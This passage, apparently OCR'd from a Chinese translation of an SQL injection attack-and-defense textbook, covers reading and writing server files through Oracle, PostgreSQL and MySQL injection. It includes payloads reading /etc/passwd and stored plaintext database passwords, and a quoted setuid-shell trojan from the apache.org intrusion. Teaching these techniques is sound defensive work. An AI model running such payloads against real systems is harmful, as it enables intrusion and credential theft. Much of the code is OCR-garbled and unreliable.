PL/SQL代码。可通过三种不同的（已知的）接口来访间文件：
●utl_file_dir/Oracle 目录
●Java
245
---
## Page 260
SQL注入攻击与防御（第2版）
●Oracle Text
默认情况下，非特权用户无法在操作系统层读或写文件。但如果使用了正确的权限，该操
作会变得很容易，
最常用的访间文件的方法是使用utl_file_dir和Oracle目录。可以使用utl_file_dir数据库参
数（Oracle9/R2及之后的版本已经不赞成使用）在操作系统层指定一个目录，所有数据库用户均
可以在该目录(检查：select name,value from vSparameter where name='UTL_FILE_DIR）中读/写/
复制文件。如果utl_file_dir的值为*，就不存在进行数据库写操作的限制.旧的未打补丁的Oracle
版本存在目录遍历问题，这使上述操作变得相当容易。
下列方法使用utl_file_dir/Oracle目录从Oracle数据库读取文件：
●utl_file(PL/SQL, Oracle 8 至 11g)
●DBMS_LOB(PL/SQL, Oracle 8 至 11g)
●外部表(PL/SQL，Oracle 9iR2至11g)
●XMLType(PL/SQL, Oracle 9i R2 至 11g)
MEDIA_DIR 目录中。
DECLARE
buf varchar2 (4096) ;
NIS38
Lob_loc:= BFILENAME(*MEDIA_DIR′, *rds.txt′);
DBMS_LOB ,OPEN (Lob_1oC, DBMS_LOB.LOB_READONLY) :
DBMS_L0B,READ (Lob_loc, 1000, 1, buf) ;
dbms_output-put_line (ut1_raw.cast_to_varchar2 (buf) );
DBMS_LOB,CLOSE (Lob_1oc):
END;
从Oracle 9i R2开始，Oracle 提供了通过外部表读取文件的能力。Oracle使用 SQL*Loader
或Oracle Data Pump(从Oracle10g开始）从结构化文件中读取数据。如果CREATETABLE语句
中存在SQL注入漏洞，就可以将标准表修改成外部表。
下面是一段针对外部表的示例代码：
create directory ext as *C:\′:
CREATE TABL& ext_tab (
1ine varchar2 (256))
ORGANIZATION EXTERNAL (TYPE oracle_loader
DEFAULT DIRECTORY eXtACCESS PARAMETERS (
RECORDS DELIMITED BY NEWLINE
BADFILE *bad_data .bad*
LOGFILE *1og_data.1og*
FIELDS TERMINATED BY *, *
MISSING FIELD VALUES ARE NULL
REJECT ROWS WITH ALL NULL FIELDS
(line) )
LOCATIoN (*victim.txt*)
PARALLEL
REJECT LIXIT 0
246
---
## Page 261
第6章利用操作系统
NOMONITORING;
接下来的代码从data-source.xml文件中读取用户名、明文口令和连接字符串。该文件是个
默认文件（在Oracle1lg中)，它包含了用于Java的连接字符串。这段代码最大的优点是：可以
在函数的 select语句内部使用它或者将其用作UNION SELECT：
select extractvalue (value (c) , */connection-factory/@user′)11′/*Ilextract
value (value (c) , */connection-factory/8passvord′) I1*@'IIsubstr (extract
value (value (c), */connection-factory/@ur1*), instz (extractvalue (value
(c),*/connection-factory/@ur1′),*//*)+2) conn
FROM table (XMLSequence (extract (xm1type (bfi1ename ( *GETPWDIR* , *datasources xm1 *) 
nls_charset_id(*wE8IS08859P1*)
‘/data-sources/connection-pool/connection-factory*
)C
除了使用ul_file_dir/Oracle目录外，还可以使用Java来读写文件。可以在MacroIvaldis的Web
站点上找到该方法的示例代码，具体地址为 www.oxdeadbcef.info/exploits/raptor_oraexcc.sql。
Oracle Text是一种很少有人知道的读取文件和URInate 的技术。它不需要Java 或utl
file_dir/Oracle目录，只需将想读取的文件或URL插入到一张表中并创建一个全文索引或者一
直等待全文索引创建成功即可。该索引了包含整个文件的内容。
下列示例代码说明了如何通过将boot.ini插入到一张表中来读取该文件：
CREATE TABLE files (id NUMBER PRIMARY KEY,
path VARCHAR (255)UNIQUE,
ot_format VARCHAR (6)
f (
INSERT INTO files VALUES (1, 'c:\boot.ini′, NULL) ;
CREATE INDEX file_index ON files (path) INDEXTYPE IS ctxsys.
contextPARAMETERS (*datastore ctxsys.file_datastore format column
（.euxo0
retrieve data from the fulltext index
Select token_text from drSfile_index$i;
4. PostgreSQL
PostgreSQL提供了内置的COPY功能，可以将文本文件复制到表中的text字段，使用COPY
功能复制文件时，该文本文件应该是完全可读的（worldreadable)，或者运行PostgreSQL进程的
用户（通常是postgres用户）应该是该文件的所有者。下面的例子演示了攻击者如何读取
/etc/passwd'文件的内容：
·创建一个临时表：
http://10.10.10.114/test,php?id=1;CREATE table temp (name text) :-
·将文件复制到表中：
247
---
## Page 262
SQL注入攻击与防御（第2版）
-,pxssed/o/,wxg duo doo t=ptdud·se/t*ot*01'0t//:dau
·读取表。在将文件复制到表中之后，就可以使用SQL注入技术来读取该表，比如使用
union技术或盲注技术，如图6-16所示。
dua woxg oueu* oooe uoun t=pdud*eo/tt*01'0t'0t//:du
DeCoCS·fommgMl
Moe'Tsted
(g/14e%2emg
dhkgpbx.11412:so
emttiefabe
图6-16读取数据库主机上的/etc/passwd文件
6.2.2写文件
过去，攻击者需要在远程主机上放置一个文本文件以证明他“捕获了自己的标志”，那时，
向远程服务器写文件有时会遇到些小挫折。事实上，当数据库中存在如此多的值时，看到人们
还在为突破数据库面困扰会令人费解。写入文件确实有其用途，通常充当影响主机的跳板（主
机反过来充当攻击内部网的“桥头堡”）。
所有常用的RDBMS均包含内置的向服务器文件系统写文件的功能。根据底层系统类型的
不同，在SQL注入攻击中滥用这些功能的程度也稍有差异。
1. MySQL
命令—selecr intoourfile(cdhumpfile)。该命令可以将一条 select语句的结果写到MySQL进程所
有者拥有的完全可读的文件中（dumpfile允许写二进制文件)。例如：
Query OK, 1 row affected (0.o0 sec)
248
---
## Page 263
第6章利用操作系统
上述语句在/tmp目录中创建了下列test.txt文件：
$ cat test.txt
This is a test
通过注入实现该操作非常方便。回到我们的内部网MySQL应用，在图6-17中，我们这次
尝试向/tmp/sp.txt文件写入SensePost 2008。
e00
Intranet - Search Cus
一
http://intrane/cgi-bin/cu
SensePost
MySQu
fearch nto
/sp.txt#Submit
图 6-17使用 into DUMPFILE写文件
使用下列搜索字符串：
aaa* union select NULL, *SensePost 2008\n′ into dumpfile */tmp/sp.txt*#
由于不想返回真正的结果以防止打乱输出文件，我们首先使用aaa搜索项，接下来使用
NULL来匹配列数以确保union发挥作用。我们使用的是dumpfile（允许输出二进制文件）而非
outfile，这样一来，要想正常结束一行，就必须提供vn。
正如我们期望的，上述操作在/tmp 目录中创建了sp.txt文件：
$ cat sp.txt
SensePost 2008
从文件系统读取二进制文件时，可以使用MySQL内置的HEX函数。我们现在向文件系
统写入二进制文件，不难想象，可以使用相反的操作一使用MySQL内置的UNHEXO函数：
mysq1> se1ect UNHEX(*53656E7365506F7374203038*) 
1(,80050220689099904399999,1X3HN0 1
1 SensePost 08
1 rov in set (0.00 sec)
借助这种组合，我们可以有效地向任何文件系统写入任何类型的文件（不能重写已有的文
件（请记住，文件应该是完全可读的）。在简要介绍使用写任何位置的文件所能实现的操作之前，
249
---
## Page 264
SQL注入攻击与防御（第2版）
您有必要了解一下当攻击者拥有相同的能力时能够对www.apache.org微哪些事情。
秘密手记
我们是怎样侵害apache.org的？
2000年5月，Apache基金会（ApacheWeb服务器的创建者）的首页受到轻微侵害，
被贴上了“PoweredByMicrosoft BackOfice”标志，制造这一恶作剧的人和Hardbeat
www.apache.org”的文章，对攻击进行了描述。
这对儿攻击者首先通过溢用一个ftpd配置错误获取了访问权，之后向Web服务器的
根目录上传了一个简陆的Web shell.这个shell允许攻击者以nobody用户身份运行低权
限的shell，他们这样描述接下来的事情：
“经过长时间搜索之后，我们发现MySQL是以root用户身份运行的并且是本地可
达的.由于apache.org正在运行BugZilla，而后者需要一个MySQL账户并且BugZilla
源中包含了该账户的用户名/口令的明文，因而可以很容易得到MySQL数据库的用户名
/口令.”
（注意：为简便起见，这里删除了一些细节）
“获取对本地主机3306端口的访问权后，接下来使用登录的bugs（拥有完全访问权
（如同在“allY's”中）提升我们的权限，这主要得益于对BugZillaREADME的粗略阅读，
它展示了一种快速解决问题的方法（使用allYs），但同时存在很多安全警告，包括“dont
_100u se bs.u un
“现在我们可以使用SELECT..INTOOUTFILE在任何位置以root身份创建文件，
这些文件处于666模式，我们不能重写任何内容，但看起来仍很有用.”
“不过使用这种能力做什么呢？写rhosts文件没有用，没有哪个明智的rshd会接受
一个所有人可写的rhosts文件。此外，rshd没有运行在该范围内.”
/*
our /root/.tcshrc
*/
所以我们决定玩儿个类似trojan（特洛伊）的“把戏”.我们使用test数据库创建了一
个仅包含一列的单列表，它包含一个80个字符的字段，之后插入了几条记录并从中选
择了一条，现在我们有了一个/root/.tcshrc，其内容类似于：
# 1 /bin/sh
cp/bin/sh /tmp/ .rootsh
chmod 4755 /tmp/.rootsh
rm -f /root/.tcshrc
/*
* ROOT!!
*/
250
---
## Page 265
第6章利用握作系统
“这很普通。现在等待有人su”，很幸运，得到9个拥有root权限的合法用户，没
花太长时间，剩下的操作也很普通，作为root用户，我们很快完成了破坏，之后生成了
一个简短的报告来列举漏润和快速修复方法，破坏后不久，我们向一个管理员发送了该
报告。”
“我们对Apache管理员团队发现破坏后的反应之快以及所采用的方法深表佩服，
即便他们称我们为“白帽子”（如果有人问，我们这里至多算“灰帽子”）.”
致敬
)和 Hardbeat
上述补充材料中突出的恶作剧虽没有使用SQL注入，但却演示了攻击者拥有SQL服务器
的访问权后可以做哪些事情。
拥有在服务器上创建文件的能力后，还有一种可能值得讨论一下：在远程主机上创建一个
用户定义函数(UDF).NGS Software 公司的 Chris Anley在其非常优秀的论文“HackProofing
添加一个UDF（根据MySQL手册）只需将UDF编译成一个对象文件即可，之后可以使用
CREATEFUNCTION和DROPFUNCTION语句从服务器添加或删除这个对象文件。
2. Microsoft SQL Server
可以使用前面介绍的读取文件的scripting.filesystem对象方法来有效地向文件系统写文件。
Anley的论文再次说明了该方法，如图6-18所示。
tdeQueryTolsWindwH
 SgL Query Analyzer -[Query - localost.master.sa -C:/)Documents and SettingsAd
X